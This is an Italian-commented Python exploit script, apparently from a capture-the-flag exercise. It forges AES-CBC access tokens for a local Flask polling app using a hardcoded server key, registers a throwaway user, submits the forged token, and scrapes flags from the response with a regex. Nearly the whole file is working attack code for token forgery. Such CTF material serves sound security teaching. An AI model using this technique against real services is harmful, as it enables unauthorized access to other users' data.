'''

Vulnerabilità: Cryptographic Failures
L'obiettivo di questo exploit/attacco è quello di catturare flag accedendo a sondaggi tramite l'utilizzo di un token. 
La creazione di questo token avviene tramite una crittografia (AES in modalità CBC, che è la stessa utilizzata dall'applicazione 
per la creazione dei token da fornire agli utenti).

'''



import requests
import random
import string
import re
from Crypto.Cipher import AES

# IP locale e port per il server Flask
ip = "127.0.0.1"
port = 5000

# Regex per cercare la flag: ricordiamo che una flag è una stringa alfanumerica di 31 caratteri seguiti da un =
flag_regex = re.compile(r"[A-Z0-9]{31}=")

server_key = b"16_r4ndom_bytes!" 



def create_token(poll_id, server_key):
    # Creo un oggetto cifrario sfruttando la conoscenza della server_key e la modalità CBC
    cipher = AES.new(server_key, AES.MODE_CBC)
    # Dopo aver convertito l'id da stringa a bytes e aver effettuato il padding aggiungendo spazi 
    # finchè non si arriva a 16 byte, possiamo cifrare il messaggio
    token = cipher.encrypt(poll_id.encode().ljust(16))
    # L'IV deve essere concatenato al messaggio cifrato; si aggiunge l'IV perche sarà necessario per decifrare il messaggio
    token = cipher.iv + token

    return token




def exploit():
    try:
        # Generazione casuale di un utente
        username_length = random.randint(5, 64)
        password_length = random.randint(5, 64)
        username = ''.join(random.choices(string.ascii_letters + string.digits, k = username_length))
        password = ''.join(random.choices(string.ascii_letters + string.digits, k = password_length))

        print(f"Registrando l'utente con username: {username} e password: {password}")
        utente = {
            'utente': username,
            'password': password
        }

        # Creiamo una sessione per l'utente
        s = requests.Session()

        # Registrazione dell'utente
        register_response = s.post(f"http://{ip}:{port}/register", data = utente)
        print(f"Status code della registrazione: {register_response.status_code}")
        if register_response.status_code != 200:
            print(f"Errore durante la registrazione per {username}")
            

        # Login dell'utente
        login_response = s.post(f"http://{ip}:{port}/login", data = utente)
        print(f"Status code del login: {login_response.status_code}")
        if login_response.status_code != 200:
            print(f"Errore durante il login per {username}")
            
        
        # Qui va implementata la logica vera e propria dell'exploit; essendo questa una prova supponiamo di 
        # conoscere già l'id del sondaggio a cui vogliamo accedere tramite token

        # Conversione del poll_id
        token = create_token("69d8239d955ba0a9", server_key)
        print(f"Token generato: {token.hex()}")


        # Accesso al sondaggio
        access_response = s.post(f"http://{ip}:{5000}/access_poll", data = {"token": token.hex()})
        if "Token invalido" in access_response.text:
            print("Errore: Token non valido per il sondaggio 69d8239d955ba0a9")
        else:
            print(f"Risposta del server:\n{access_response.text}")

            # Se l'accesso al sondaggio è andato a buon fine, si cerca all'interno della pagina per trovare le flag
            # La funzione findall restituisce una lista di stringhe che potrebbero contenere duplicati:
            # per evitare ciò convertiamo la lista in un set
            flags = set(flag_regex.findall(access_response.text))  
            print(f"Trovate flag da {ip}: {flags}")


    except Exception as e:
        print(f"Errore durante l'exploit per {ip}: {str(e)}")





# Esecuzione dell'exploit
if __name__ == '__main__':
    exploit()
